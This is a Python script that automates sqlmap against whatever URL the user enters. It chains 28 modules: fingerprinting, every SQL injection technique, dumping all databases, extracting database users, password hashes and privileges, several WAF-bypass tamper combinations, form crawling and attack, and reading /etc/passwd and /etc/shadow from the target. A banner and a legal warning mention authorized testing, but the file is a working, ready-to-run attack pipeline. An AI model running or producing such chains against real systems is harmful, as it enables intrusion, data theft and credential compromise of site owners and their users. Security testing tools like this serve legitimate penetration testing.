#!/usr/bin/env python3
# ============================================================
#   SQLMap Auto Runner — Kali Linux
#   Usage: python3 sqlmap_auto.py
#   Just enter the URL — it runs everything automatically.
# ============================================================

import subprocess
import sys
import os
import datetime
import time

# ── Colors ──────────────────────────────────────────────────
R   = "\033[1;31m"
G   = "\033[1;32m"
Y   = "\033[1;33m"
C   = "\033[1;36m"
M   = "\033[1;35m"
W   = "\033[1;37m"
DIM = "\033[2;32m"
RS  = "\033[0m"

BANNER = f"""
{G}╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  {C}  ██████╗  ██████╗ ██╗      {Y}███╗   ███╗ █████╗ ██████╗     {G}║
║  {C} ██╔════╝ ██╔═══██╗██║      {Y}████╗ ████║██╔══██╗██╔══██╗    {G}║
║  {C} ╚█████╗  ██║   ██║██║      {Y}██╔████╔██║███████║██████╔╝    {G}║
║  {C}  ╚═══██╗ ██║▄▄ ██║██║      {Y}██║╚██╔╝██║██╔══██║██╔═══╝     {G}║
║  {C} ██████╔╝ ╚██████╔╝███████╗ {Y}██║ ╚═╝ ██║██║  ██║██║         {G}║
║  {C} ╚═════╝   ╚══▀▀═╝ ╚══════╝ {Y}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝         {G}║
║                                                              ║
║        {W}FULL AUTO MODE  —  Runs all modules sequentially{G}       ║
║        {DIM}For authorized penetration testing only{G}               ║
╚══════════════════════════════════════════════════════════════╝{RS}
"""


def clear():
    os.system("clear")


def check_sqlmap():
    if not subprocess.run(["which", "sqlmap"], capture_output=True).stdout.strip():
        print(f"{R}[!] sqlmap not found. Install it: sudo apt install sqlmap{RS}")
        sys.exit(1)


def make_outdir(url):
    safe = url.replace("https://", "").replace("http://", "").replace("/", "_").replace(":", "_")
    safe = "".join(c for c in safe if c.isalnum() or c in "_-")[:50]
    ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    d    = f"sqlmap_results/{safe}_{ts}"
    os.makedirs(d, exist_ok=True)
    return d


def progress_bar(step, total, width=30):
    filled = int(width * step / total)
    bar    = G + "█" * filled + DIM + "░" * (width - filled) + RS
    pct    = int(100 * step / total)
    return f"[{bar}{G}] {W}{pct}%{RS}"


def step_header(step, total, label, tag, tag_color):
    print(f"\n{G}{'═' * 66}")
    print(f"  {tag_color}[{tag}]{W}  {label}")
    print(f"  {DIM}Module {step}/{total}  {RS}{progress_bar(step, total)}")
    print(f"{G}{'═' * 66}{RS}\n")


def run_cmd(label, cmd, logfile, step, total, tag="RUN", tag_color=C):
    step_header(step, total, label, tag, tag_color)
    print(f"{DIM}  $ {' '.join(cmd)}{RS}\n")

    with open(logfile, "a") as lf:
        lf.write(f"\n{'=' * 66}\n[{step}/{total}] {label}\n")
        lf.write(f"CMD: {' '.join(cmd)}\n")
        lf.write(f"TIME: {datetime.datetime.now()}\n{'=' * 66}\n")

    outcome = "ok"
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        with open(logfile, "a") as lf:
            for line in proc.stdout:
                sys.stdout.write(line)
                sys.stdout.flush()
                lf.write(line)
        proc.wait()
        status = f"{G}[✓] Module complete{RS}" if proc.returncode == 0 \
                 else f"{Y}[~] Finished (exit code {proc.returncode}){RS}"
    except KeyboardInterrupt:
        try:
            proc.kill()
        except Exception:
            pass
        print(f"\n{Y}[!] Module skipped — moving to next...{RS}")
        status  = f"{Y}[!] Skipped by user{RS}"
        outcome = "skip"
        time.sleep(0.8)
    except Exception as e:
        status  = f"{R}[✗] Error: {e}{RS}"
        outcome = "fail"

    with open(logfile, "a") as lf:
        lf.write(f"\nRESULT: {outcome}\n")
    print(f"\n  {status}\n")
    time.sleep(0.3)
    return outcome


def get_config():
    print(f"\n{G}┌─ TARGET SETUP {'─' * 49}┐{RS}")
    url     = input(f"  {C}URL       {G}▶ {W}").strip()
    if not url:
        print(f"{R}[!] URL is required.{RS}")
        sys.exit(1)
    data    = input(f"  {C}POST data {G}▶ {W}(leave blank for GET)         ").strip()
    cookie  = input(f"  {C}Cookie    {G}▶ {W}(optional)                    ").strip()
    db      = input(f"  {C}Database  {G}▶ {W}(target DB name, optional)    ").strip()
    risk    = input(f"  {C}Risk      {G}▶ {W}[1-3]   default=1             ").strip() or "1"
    level   = input(f"  {C}Level     {G}▶ {W}[1-5]   default=3             ").strip() or "3"
    threads = input(f"  {C}Threads   {G}▶ {W}[1-10]  default=4             ").strip() or "4"
    print(f"{G}└{'─' * 63}┘{RS}")

    risk    = risk    if risk    in ["1","2","3"]                     else "1"
    level   = level   if level   in ["1","2","3","4","5"]            else "3"
    threads = threads if threads.isdigit() and 1 <= int(threads) <= 10 else "4"

    return dict(url=url, data=data, cookie=cookie, db=db,
                risk=risk, level=level, threads=threads)


def base(cfg):
    f = ["-u", cfg["url"], "--batch", f"--threads={cfg['threads']}"]
    if cfg["data"]:   f += ["--data",   cfg["data"]]
    if cfg["cookie"]: f += ["--cookie", cfg["cookie"]]
    return f


def build_commands(cfg):
    b  = base(cfg)
    lv = f"--level={cfg['level']}"
    rk = f"--risk={cfg['risk']}"
    db = ["-D", cfg["db"]] if cfg["db"] else []

    return [
        # ── RECON ─────────────────────────────────────────────────
        ("Quick Smart Detection",              "RECON",  C,
         ["sqlmap"] + b + ["--smart", "--fingerprint"]),

        ("Detect DBMS & Server Version",       "RECON",  C,
         ["sqlmap"] + b + ["--fingerprint", lv]),

        ("Parse & Analyze Errors",             "RECON",  C,
         ["sqlmap"] + b + ["--parse-errors"]),

        ("Get Current Database & User",        "RECON",  C,
         ["sqlmap"] + b + ["--current-db", "--current-user"]),

        ("Check DBA Privileges",               "RECON",  C,
         ["sqlmap"] + b + ["--is-dba"]),

        # ── INJECTION ─────────────────────────────────────────────
        ("Full Scan — All Techniques",         "INJECT", R,
         ["sqlmap"] + b + [lv, rk, "--technique=BEUSTQ"]),

        ("Boolean-based Blind",                "INJECT", R,
         ["sqlmap"] + b + ["--technique=B", lv]),

        ("Time-based Blind (5s timeout)",      "INJECT", R,
         ["sqlmap"] + b + ["--technique=T", lv, "--time-sec=5"]),

        ("Error-based Injection",              "INJECT", R,
         ["sqlmap"] + b + ["--technique=E", lv]),

        ("UNION-based Injection",              "INJECT", R,
         ["sqlmap"] + b + ["--technique=U", "--union-cols=1-25"]),

        ("Stacked Queries",                    "INJECT", R,
         ["sqlmap"] + b + ["--technique=S", lv, rk]),

        # ── ENUMERATE & DUMP ──────────────────────────────────────
        ("Enumerate All Databases",            "DUMP",   Y,
         ["sqlmap"] + b + ["--dbs"]),

        ("Enumerate Tables",                   "DUMP",   Y,
         ["sqlmap"] + b + db + ["--tables"]),

        ("Enumerate Columns",                  "DUMP",   Y,
         ["sqlmap"] + b + db + ["--columns"]),

        ("Dump All Data (excl. system DBs)",   "DUMP",   Y,
         ["sqlmap"] + b + db + ["--dump-all", "--exclude-sysdbs"]),

        ("Extract DB Users",                   "DUMP",   Y,
         ["sqlmap"] + b + ["--users"]),

        ("Extract DB Password Hashes",         "DUMP",   Y,
         ["sqlmap"] + b + ["--passwords"]),

        ("Extract DB Privileges",              "DUMP",   Y,
         ["sqlmap"] + b + ["--privileges"]),

        # ── WAF / BYPASS ──────────────────────────────────────────
        ("Bypass WAF: space2comment",          "BYPASS", G,
         ["sqlmap"] + b + ["--tamper=space2comment", lv]),

        ("Bypass WAF: randomcase",             "BYPASS", G,
         ["sqlmap"] + b + ["--tamper=randomcase", lv]),

        ("Bypass WAF: multi-tamper combo",     "BYPASS", G,
         ["sqlmap"] + b + ["--tamper=space2comment,randomcase,between", lv, rk]),

        ("Bypass WAF: unicode + hex encode",   "BYPASS", G,
         ["sqlmap"] + b + ["--tamper=charunicodeescape,space2comment", "--hex", lv]),

        ("Bypass WAF: base64 encode",          "BYPASS", G,
         ["sqlmap"] + b + ["--tamper=base64encode", lv]),

        ("Bypass WAF: chunked transfer",       "BYPASS", G,
         ["sqlmap"] + b + ["--chunked", "--tamper=space2comment"]),

        # ── CRAWL & FORMS ─────────────────────────────────────────
        ("Crawl Site (depth 3)",               "CRAWL",  M,
         ["sqlmap"] + b + ["--crawl=3", "--smart"]),

        ("Auto-detect & Attack Forms",         "CRAWL",  M,
         ["sqlmap"] + b + ["--forms", "--smart", lv]),

        # ── OS / FILE ACCESS ──────────────────────────────────────
        ("Read File: /etc/passwd",             "OS",     W,
         ["sqlmap"] + b + ["--file-read=/etc/passwd"]),

        ("Read File: /etc/shadow",             "OS",     W,
         ["sqlmap"] + b + ["--file-read=/etc/shadow"]),
    ]


def print_summary(outdir, logfile, results, cmds):
    ok      = results.count("ok")
    skipped = results.count("skip")
    failed  = results.count("fail")
    total   = len(results)

    print(f"\n{G}{'═' * 66}")
    print(f"  {W}SESSION COMPLETE")
    print(f"{G}{'═' * 66}")
    print(f"  {G}✓  Completed : {W}{ok}/{total}")
    print(f"  {Y}⊘  Skipped   : {W}{skipped}")
    print(f"  {R}✗  Failed    : {W}{failed}")
    print(f"\n  {C}Results folder : {W}{outdir}/")
    print(f"  {C}Full log       : {W}{logfile}")

    # Write summary to log
    with open(logfile, "a") as lf:
        lf.write(f"\n{'=' * 66}\nSESSION SUMMARY\n")
        lf.write(f"Completed: {ok}/{total}  Skipped: {skipped}  Failed: {failed}\n")
        lf.write(f"Ended: {datetime.datetime.now()}\n{'=' * 66}\n")
        lf.write("\nMODULE RESULTS:\n")
        for i, (outcome, (label, tag, _, cmd)) in enumerate(zip(results, cmds), 1):
            lf.write(f"  [{i:02d}] {outcome.upper():8s}  [{tag}] {label}\n")

    print(f"\n{G}{'═' * 66}{RS}\n")


def main():
    clear()
    print(BANNER)
    check_sqlmap()

    print(f"{Y}  ⚠  LEGAL WARNING: Use only on systems you own or have explicit written")
    print(f"     authorization to test. Unauthorized use is illegal.{RS}\n")

    cfg    = get_config()
    outdir = make_outdir(cfg["url"])
    log    = os.path.join(outdir, "results.log")

    cmds  = build_commands(cfg)
    total = len(cmds)

    # Session header in log
    with open(log, "w") as lf:
        lf.write(f"SQLMap Auto Runner — Session Log\n")
        lf.write(f"Target  : {cfg['url']}\n")
        lf.write(f"Post    : {cfg['data'] or 'N/A'}\n")
        lf.write(f"Cookie  : {cfg['cookie'] or 'N/A'}\n")
        lf.write(f"DB      : {cfg['db'] or 'N/A'}\n")
        lf.write(f"Config  : risk={cfg['risk']}  level={cfg['level']}  threads={cfg['threads']}\n")
        lf.write(f"Modules : {total}\n")
        lf.write(f"Started : {datetime.datetime.now()}\n")
        lf.write(f"{'=' * 66}\n")

    print(f"\n{G}  [✓] {total} modules queued")
    print(f"  [✓] Saving output to : {W}{outdir}/{G}")
    print(f"  [✓] Live log         : {W}{log}{G}")
    print(f"\n{Y}  Ctrl+C once  →  skip current module")
    print(f"  Ctrl+C twice →  quit entirely{RS}\n")

    input(f"  {C}Press {W}ENTER{C} to start the full scan...{RS}")

    results = []
    for i, (label, tag, tag_color, cmd) in enumerate(cmds, 1):
        outcome = run_cmd(label, cmd, log, i, total, tag, tag_color)
        results.append(outcome)

    print_summary(outdir, log, results, cmds)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Session terminated by user.{RS}\n")
        sys.exit(0)
